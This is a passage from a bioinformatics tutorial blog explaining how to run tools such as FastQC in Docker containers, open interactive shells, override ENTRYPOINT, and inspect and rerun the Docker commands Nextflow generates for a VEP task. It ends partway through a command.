<p><em>Bottom line:</em> Containers and Conda have solved the nightmare of manual installs, making reproducible science and collaboration routine in bioinformatics.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-using-docker-containers-for-bioinformatics-data-analysis">2. Using Docker Containers for Bioinformatics Data Analysis<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#2-using-docker-containers-for-bioinformatics-data-analysis" class="hash-link" aria-label="Direct link to 2. Using Docker Containers for Bioinformatics Data Analysis" title="Direct link to 2. Using Docker Containers for Bioinformatics Data Analysis" translate="no">​</a></h2>
<p>One of the biggest advantages of Docker is the ability to run bioinformatics tools directly—without any installation—on your own datasets. Here’s a practical example using FastQC, a widely used quality control tool for sequencing data.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-run-fastqc-from-a-container">Example: Run FastQC from a Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#example-run-fastqc-from-a-container" class="hash-link" aria-label="Direct link to Example: Run FastQC from a Container" title="Direct link to Example: Run FastQC from a Container" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Pull the FastQC container (only needed once):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Replace &lt;version&gt; with the specific tag, e.g. 0.11.9--hdfd78af_1</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Run FastQC, mounting your data folder:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> fastqc /data/my_reads.fastq</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>--rm</code>: Automatically remove the container after it exits.</li>
<li class=""><code>-v "$PWD:/data"</code>: Mount your current directory (with your FASTQ file) into the container at <code>/data</code>.</li>
<li class="">The container runs the FastQC executable, analyzing the file and writing results back to your folder.</li>
</ul>
</li>
</ol>
<p><strong>Key Benefits:</strong></p>
<ul>
<li class="">No software installation or dependency headaches.</li>
<li class="">Exact version and environment guaranteed.</li>
<li class="">Can share or rerun analysis anywhere Docker is available (Linux, Mac, Windows, cloud, HPC).</li>
</ul>
<p>This approach works for thousands of bioinformatics containers—swap FastQC for Samtools, BWA, STAR, or other tools and run your analysis fully reproducibly and portable.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-containers-interactively">Running Containers Interactively<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#running-containers-interactively" class="hash-link" aria-label="Direct link to Running Containers Interactively" title="Direct link to Running Containers Interactively" translate="no">​</a></h3>
<p>Sometimes you want to run tools or explore interactively inside the container, just as if you were launching a shell. Docker makes this easy with the <code>-it</code> flags:</p>
<ul>
<li class=""><code>-i</code> keeps STDIN open (interactive input)</li>
<li class=""><code>-t</code> allocates a pseudo-terminal (TTY)</li>
</ul>
<p><strong>Example: Start an interactive shell inside the FastQC container:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /bin/bash</span><br></span></code></pre></div></div>
<p>Now you’re inside the container shell:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc /data/my_reads.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> /data</span><br></span></code></pre></div></div>
<p><strong>Benefits:</strong></p>
<ul>
<li class="">Inspect files, experiment with commands, or troubleshoot in real-time</li>
<li class="">Explore the container environment (dependencies, installed tools)</li>
<li class="">Still fully reproducible every time you launch</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debugging-and-inspecting-a-running-docker-container">Debugging and Inspecting a Running Docker Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#debugging-and-inspecting-a-running-docker-container" class="hash-link" aria-label="Direct link to Debugging and Inspecting a Running Docker Container" title="Direct link to Debugging and Inspecting a Running Docker Container" translate="no">​</a></h3>
<p>If your container is already running (perhaps as part of a pipeline or a background process), Docker lets you connect and debug interactively using <code>docker exec</code>:</p>
<ol>
<li class="">
<p>List running containers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ps</span><br></span></code></pre></div></div>
<p>Note the CONTAINER ID in the output.</p>
</li>
<li class="">
<p>Start a bash shell inside the running container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">CONTAINER_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /bin/bash</span><br></span></code></pre></div></div>
<p>Now you can inspect files, check logs, and run additional commands inside the live container.</p>
</li>
</ol>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="entrypoint-and-overriding-commands">ENTRYPOINT and Overriding Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#entrypoint-and-overriding-commands" class="hash-link" aria-label="Direct link to ENTRYPOINT and Overriding Commands" title="Direct link to ENTRYPOINT and Overriding Commands" translate="no">​</a></h3>
<p>Many containers run a specific tool as their default ENTRYPOINT—for example, FastQC containers launch FastQC automatically. However, you can temporarily override ENTRYPOINT and start a shell using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--entrypoint</span><span class="token plain"> /bin/bash quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><br></span></code></pre></div></div>
<p>This starts an interactive shell even if the container’s Dockerfile specifies a different default command. Useful for debugging, troubleshooting, or exploring the container environment.</p>
<p><strong>Summary:</strong></p>
<ul>
<li class="">Use <code>docker exec</code> to debug running containers</li>
<li class="">Override ENTRYPOINT for interactive shells</li>
<li class="">Enables real-time troubleshooting and inspection, making containers even more flexible for science</li>
</ul>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-containers-with-nextflow-inspecting-the-actual-docker-commands">Running Containers with Nextflow: Inspecting the Actual Docker Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#running-containers-with-nextflow-inspecting-the-actual-docker-commands" class="hash-link" aria-label="Direct link to Running Containers with Nextflow: Inspecting the Actual Docker Commands" title="Direct link to Running Containers with Nextflow: Inspecting the Actual Docker Commands" translate="no">​</a></h3>
<p>When you run a Nextflow pipeline with Docker containers, Nextflow automatically generates and executes Docker commands for each task. Understanding these commands is useful for debugging, profiling, and understanding exactly what your pipeline is doing.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="where-nextflow-stores-docker-commands">Where Nextflow Stores Docker Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#where-nextflow-stores-docker-commands" class="hash-link" aria-label="Direct link to Where Nextflow Stores Docker Commands" title="Direct link to Where Nextflow Stores Docker Commands" translate="no">​</a></h4>
<p>Nextflow creates a work directory structure where each task has its own folder containing:</p>
<ul>
<li class=""><code>.command.sh</code> - The shell script to execute</li>
<li class=""><code>.command.run</code> - The wrapper script that Nextflow uses to run the task</li>
<li class=""><code>.command.trace</code> - Task execution trace</li>
<li class=""><code>.exitcode</code> - Exit code of the task</li>
<li class="">Output files from the task</li>
</ul>
<p><strong>Directory structure:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">work/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── ab/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── abc123def456.../</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.trace</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   └── ... (output files)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── def789ghi012.../</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       └── ...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── fe/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └── 949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ├── .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ├── .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        └── ... (task outputs)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="viewing-the-actual-docker-command">Viewing the Actual Docker Command<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#viewing-the-actual-docker-command" class="hash-link" aria-label="Direct link to Viewing the Actual Docker Command" title="Direct link to Viewing the Actual Docker Command" translate="no">​</a></h4>
<p>To see the exact Docker command that Nextflow executed for a specific task:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Find your task's work directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># For example, in the pipeline output you might see:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#   vep (ensembl-vep:115.2) [fe/949a78b...]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Navigate to that directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> work/fe/949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. View the command that was executed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.run</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-nextflow-docker-command-for-vep-variant-effect-predictor">Example: Nextflow Docker Command for VEP (Variant Effect Predictor)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#example-nextflow-docker-command-for-vep-variant-effect-predictor" class="hash-link" aria-label="Direct link to Example: Nextflow Docker Command for VEP (Variant Effect Predictor)" title="Direct link to Example: Nextflow Docker Command for VEP (Variant Effect Predictor)" translate="no">​</a></h4>
<p>Here's a complete example of how Nextflow runs a Docker container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> stop </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --cpu-shares </span><span class="token number" style="color:hsl(35, 99%, 36%)">8192</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> 14336m </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_TASK_WORKDIR"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_DEBUG=</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${NXF_DEBUG</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:=</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">0}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NXF_TASK_WORKDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--name</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  community.wave.seqera.io/library/ensembl-vep:115.2--90ec797ecb088e9a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  /bin/bash </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/work/fe/949a78b06c5fd8284aeb2f87d14f7d/.command.run nxf_trace</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="breaking-down-the-docker-command">Breaking Down the Docker Command<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#breaking-down-the-docker-command" class="hash-link" aria-label="Direct link to Breaking Down the Docker Command" title="Direct link to Breaking Down the Docker Command" translate="no">​</a></h4>
<p>Let's understand each component:</p>
<table><thead><tr><th>Component</th><th>Purpose</th></tr></thead><tbody><tr><td><code>docker run</code></td><td>Start a new container</td></tr><tr><td><code>-i</code></td><td>Keep STDIN open (interactive)</td></tr><tr><td><code>--cpu-shares 8192</code></td><td>Allocate CPU resources (set by Nextflow from cpus directive)</td></tr><tr><td><code>--memory 14336m</code></td><td>Limit memory to 14GB (set by Nextflow from memory directive)</td></tr><tr><td><code>-e NXF_TASK_WORKDIR</code></td><td>Pass Nextflow task work directory env var</td></tr><tr><td><code>-e NXF_DEBUG=${NXF_DEBUG:=0}</code></td><td>Pass debug flag</td></tr><tr><td><code>-v /project:/project</code></td><td>Mount project directory for input/output</td></tr><tr><td><code>-w "$NXF_TASK_WORKDIR"</code></td><td>Set working directory inside container</td></tr><tr><td><code>-u $(id -u):$(id -g)</code></td><td>Run as current user (file permissions)</td></tr><tr><td><code>--name $NXF_BOXID</code></td><td>Name the container (cleanup reference)</td></tr><tr><td><code>image:tag</code></td><td>Container image to use</td></tr><tr><td><code>/bin/bash .command.run</code></td><td>Execute the task script</td></tr><tr><td><code>nxf_trace</code></td><td>Nextflow tracing flag</td></tr></tbody></table>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="re-running-a-failed-task-manually">Re-Running a Failed Task Manually<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#re-running-a-failed-task-manually" class="hash-link" aria-label="Direct link to Re-Running a Failed Task Manually" title="Direct link to Re-Running a Failed Task Manually" translate="no">​</a></h4>
<p>If a task fails in Nextflow, you can manually re-run it for debugging:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Navigate to the task work directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> work/fe/949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. View the task script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. View Nextflow's Docker wrapper</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Manually run the Docker command (copy from .command.run output)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># and inspect what went wrong</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --cpu-shares </span><span class="token number" style="color:hsl(35, 99%, 36%)">8192</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> 14336m </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_TASK_WORKDIR"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NXF_TASK_WORKDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> 